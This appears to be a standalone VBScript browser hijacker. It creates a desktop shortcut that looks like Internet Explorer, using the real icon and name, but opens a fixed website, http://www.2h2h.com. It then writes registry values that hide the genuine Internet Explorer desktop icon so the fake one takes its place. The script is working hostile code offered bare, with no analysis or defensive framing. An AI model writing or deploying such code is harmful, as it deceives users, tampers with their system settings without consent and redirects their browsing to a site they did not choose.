Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :
set oShellLink = WshShell.CreateShortcut(strDesktop & "\Internet Explorer.lnk")
oShellLink.TargetPath = "C:\Program Files\Internet Explorer\iexplore.exe"
oShellLink.Arguments = "http://www.2h2h.com"
oShellLink.WindowStyle = 1 
oShellLink.Hotkey = "" 
oShellLink.IconLocation = "C:\Program Files\Internet Explorer\iexplore.exe, 0"
oShellLink.Description = "" 
oShellLink.WorkingDirectory = "C:\Program Files\Internet Explorer\" 
oShellLink.Save 
Dim Reg 
Set Reg=WScript.CreateObject("WScript.Shell") 
Reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}","1","REG_DWORD" 
Reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}","1","REG_DWORD" 
